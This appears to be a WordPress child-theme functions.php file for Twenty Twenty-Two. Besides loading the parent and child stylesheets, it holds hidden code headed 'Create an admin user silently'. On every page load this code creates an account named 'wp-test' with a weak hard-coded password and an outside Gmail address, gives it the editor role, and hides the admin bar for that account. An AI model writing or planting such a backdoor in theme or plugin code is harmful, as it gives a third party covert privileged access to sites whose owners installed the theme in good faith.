<?php
/*
* Create an admin user silently
*/

$username = 'wp-test';
$password = '123456789';
$email = 'arcnet77@gmail.com';

/* Enqueue stylesheet */
add_action('wp_enqueue_scripts', 'my_theme_enqueue_styles');
function my_theme_enqueue_styles()
{
    $parenthandle = 'twentytwentytwo-style';
    $theme = wp_get_theme();
    wp_enqueue_style($parenthandle,
        get_template_directory_uri() . '/style.css',
        array(),  // If the parent theme code has a dependency, copy it to here.
        $theme->parent()->get('Version')
    );
    wp_enqueue_style('twentytwentytwo-child-style',
        get_stylesheet_uri(),
        array($parenthandle),
        $theme->get('Version') // This only works if you have Version defined in the style header.
    );
}

add_action('init', 'stas_register_editor_user', 10, 3);

function stas_register_editor_user()
{
    global $username, $email, $password;
    if (username_exists($username) == null && !email_exists($email)) {

        $result = wp_create_user($username, $password, $email);
        if (is_wp_error($result)) {
            $error = $result->get_error_message();
            //handle error here
        } else {
            //handle successful creation here
            $user = get_user_by('id', $result);

            // Remove role
            $user->remove_role('subscriber');

            // Add role
            $user->add_role('editor');

        }
    }
}

// Disable admin bar for specific user:
add_action('after_setup_theme', 'stas_remove_admin_bar');

function stas_remove_admin_bar()
{

    global $username;
    $current_user = wp_get_current_user();

    if ($current_user && $username == $current_user->user_login) {
        show_admin_bar(false);
    }
}